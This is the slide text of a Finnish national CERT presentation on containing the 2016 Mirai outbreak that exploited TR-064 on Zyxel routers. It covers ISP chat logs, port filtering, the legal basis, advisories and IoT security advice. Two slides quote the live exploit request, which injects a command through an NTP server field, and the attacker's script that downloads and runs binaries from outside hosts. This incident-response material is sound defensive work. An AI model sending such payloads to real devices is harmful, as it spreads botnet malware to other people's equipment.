Disrupting IoT worms in Finland (2016 edition)
Markus Lintula, Information Security Specialist
National Cyber Security Centre Finland

NCSC-FI in a nutshell
National CERT (formerly known as CERT-FI)
» Critical infrastructure organisations and providers
» State government (GovCERT) » ISPs, Telcos » Other organisations, citizens
National Communication Security Authority (formerly known as NCSA-FI)
» Assessment of information used in national government
National Regulatory Authority
» Supervision of telecommunications carriers, incl. ISPs
» Privacy of electronic communications
NCSC-FI is a part of the Finnish Communications Regulatory Authority (FICORA)
Markus Lintula | Information Security Specialist

9 June 2017 |

Mirai on a rampage
9 June 2017

Status on Friday 2016-11-25

Markus Lintula | Information Security Specialist

9 June 2017 |

Status on Monday 2016-11-28

Markus Lintula | Information Security Specialist

9 June 2017 |

Meanwhile on the NCSC-FI IRC
09:46 <BigISP> some kind of massive TCP7547 scan wave ongoing, especially Zyxel-devices affected. A couple hundred customers to disconnect. 09:47 <BigISP> the same botnet also randomly tries TCP5555 09:48 <Markus_NCSC-FI> BigISP: most likely looking for these: https://www.exploit-db.com/exploits/40740/ 09:48 <Markus_NCSC-FI> Eir D1000 Wireless Router (which turned out to be made by Zyxel) 11:00 <BigISP> damn. We have almost 14000 customers scanning TCP7547 in the previous 24h 11:02 <OtherISP> So you have a botnet of 14k customers? Ouch. 11:07 <BigISP> yes we do

Markus Lintula | Information Security Specialist

9 June 2017 |

The culprit: Mirai & TR-064
9 June 2017

Vulnerability in TR-064 implementation
TR-064 is meant for configuration of home routers. It should be available only from the internal network (LAN)
Some Zyxel devices exposed TR-064 to the internet through TR-069
TR-069 listens to the Internet facing port TCP/7547 on WAN
After the infection Mirai will firewall the port:

Markus Lintula | Information Security Specialist

9 June 2017 |

One request and you're owned
POST /UD/act?1 HTTP/1.1 Host: 127.0.0.1:7547 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) SOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers Content-Type: text/xml Content-Length: 519
<?xml version="1.0"?> <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<SOAP-ENV:Body> <u:SetNTPServers xmlns:u="urn:dslforum-org:service:Time:1"> <NewNTPServer1>`cd /var/tmp;cd /tmp;wget http://kciap.pw/a;sh a` </NewNTPServer1> <NewNTPServer2></NewNTPServer2> <NewNTPServer3></NewNTPServer3> <NewNTPServer4></NewNTPServer4> <NewNTPServer5></NewNTPServer5> </u:SetNTPServers>
</SOAP-ENV:Body> </SOAP-ENV:Envelope>

Markus Lintula | Information Security Specialist

9 June 2017 |

What's in the script?
cd /var/tmp;cd /tmp;wget http://93.190.142.201/1;chmod 777 1;busybox chmod 777 1;./1;rm -f ./* cd /var/tmp;cd /tmp;wget http://93.190.142.201/2;chmod 777 2;busybox chmod 777 2;./2;rm -f ./* cd /var/tmp;cd /tmp;wget http://93.190.142.201/3;chmod 777 3;busybox chmod 777 3;./3;rm -f ./* cd /var/tmp;cd /tmp;wget http://93.190.142.201/4;chmod 777 4;busybox chmod 777 4;./4;rm -f ./* cd /var/tmp;cd /tmp;wget http://93.190.142.201/5;chmod 777 4;busybox chmod 777 5;./5;rm -f ./* cd /var/tmp;cd /tmp;wget http://93.190.142.201/6;chmod 777 4;busybox chmod 777 6;./6;rm -f ./*
The script dowloads the malware for different platforms and tries to run them. After this it removes the downloaded files
» Malware is only running in memory
 Mirai is gone after a reboot

Markus Lintula | Information Security Specialist

9 June 2017 |

NCSC-FI actions
9 June 2017

Filter the exploit traffic
Prepare recommendation to all ISPs in Finland to filter TCP port 7547
» Prevents new infections
Recommendation is sent out to ISPs on Monday afternoon

Markus Lintula | Information Security Specialist

9 June 2017 |

Legal background
Information Society Code (917/2014)
Section 304 - Special duties of Ficora:
» 7) collect information on violations of and threats to information security in respect of network services, communications services and added value services
» 8) disseminate information security matters as well as communications network and service matters
» 10) investigate violations of and threats to information security in respect of network services, communications services and added value services;

Markus Lintula | Information Security Specialist

9 June 2017 |

Filtering traffic
Section 272 - Measures taken to implement information security
» A telecommunications operator has the right to undertake necessary measures referred to in subsection 2 for ensuring information security:
» 1) in order to detect, prevent, investigate and commit to pre-trial investigation any disruptions in information security of communications networks or related services
Measures referred to in subsection 1 above may include:
» 2) automatic prevention or limitation of message transmission or reception;

Markus Lintula | Information Security Specialist

9 June 2017 |

Success!
Majority of the telecoms followed the recommendation within 12h
Mirai is no longer able to spread in Finnish networks using this vulnerability
Some ISPs also started tracking the C2 addresses and notifying the customers who were communicating with them.

Markus Lintula | Information Security Specialist

9 June 2017 |

Contact vendors, gather information
Collect list of vulnerable devices
» Zyxel AMG1302-T10B » Zyxel AMG1302-T11C » Zyxel AMG1312-T10B » Zyxel AMG1202-T10B (End-of-life) » Zyxel P-660HN-T1A (End-of-life) » Zyxel P660HN-T1Av2 (End-of-life)
Providing ISPs with C2 addresses from new Mirai samples collected by the infosec community

Markus Lintula | Information Security Specialist

9 June 2017 |

Publish advisory
A red alert (the highest warning level we have) was published on Tuesday
Recommendation to reboot and patch vulnerable devices
Problems:
» Patches are not available yet » Many devices require ISP specific configurations » If the ISP isn't filtering the exploit traffic, it will get re-
infected.

Markus Lintula | Information Security Specialist

9 June 2017 |

Markus Lintula | Information Security Specialist

9 June 2017 |

Status on Tuesday 2016-11-29

Markus Lintula | Information Security Specialist

9 June 2017 |

One week later 2016-12-07

Markus Lintula | Information Security Specialist

9 June 2017 |

Available patches on 2016-12-08

Markus Lintula | Information Security Specialist

9 June 2017 |

The result

Markus Lintula | Information Security Specialist

9 June 2017 |

IoT security

Markus Lintula | Information Security Specialist

9 June 2017 |

In the cleanest networks of the world...

Milking machine calls home

Home audio amplifier is a bot

Room reservation panel downloads and shows ads

Guitar amplifier participates in
DDoS

Ground-source heat pump scans
for vulnerabilities

Markus Lintula | Information Security Specialist

9 June 2017 |

What can we do?

9 June 2017

Advice for better product security

Common mistakes
Insecure User Interfaces Web interfaces vulnerable to SQL injections, command line interfaces with no data input validation
Hard-coded passwords Restoration of systems and data after an infection cause long breaks to production.
Open ports that are not needed Exposes the device to hackers.
Lack of proper upgrade mechanisms IoT devices will be left without any possibility to update them

Solution proposals
Follow secure coding practices Sanitize inputs, pay attention to authentication mechanisms, prevent cross-site scripting
Do not use them Do not hard code passwords or other credentials, not even your "support" account! Force the change of default credential in the install phase
Only open ports that are needed Ensure that all necessary ports are closed by scanning the product ­ do not rely on assumption!
Keep developing patches to your products
Find a way to distribute them effectively and reliably

Markus Lintula | Information Security Specialist

9 June 2017 |

Any questions?
Contact me at markus.lintula@ficora.fi
www.ncsc.fi www.ficora.fi

